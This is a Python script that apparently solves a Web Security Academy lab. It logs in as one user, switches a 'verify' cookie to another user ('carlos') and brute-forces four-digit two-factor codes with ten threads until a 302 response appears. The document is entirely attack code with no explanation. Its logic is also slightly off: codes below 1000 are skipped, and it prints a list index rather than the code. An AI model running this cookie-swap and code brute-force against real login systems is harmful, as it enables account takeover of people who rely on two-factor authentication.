import requests
from concurrent.futures import ThreadPoolExecutor

url = 'https://ac761f0a1fcfe352c0e75a05003700e0.web-security-academy.net/login'
data = {'username':'wiener','password':'peter'}
r = requests.post(url, data=data)
url2 = r.url

def brute_2fa(payload):
		cookie = {'verify':'carlos'}
		r2 = requests.post(url2, cookies=cookie, data=payload)
		return r2.status_code
payload= []
for i in range(1000,10000):
	payload.append({'mfa-code':i})

with ThreadPoolExecutor(max_workers=10) as pool:
    response_list = list(pool.map(brute_2fa,payload))

for response in response_list:
    print(response)

print(response_list.index(302))
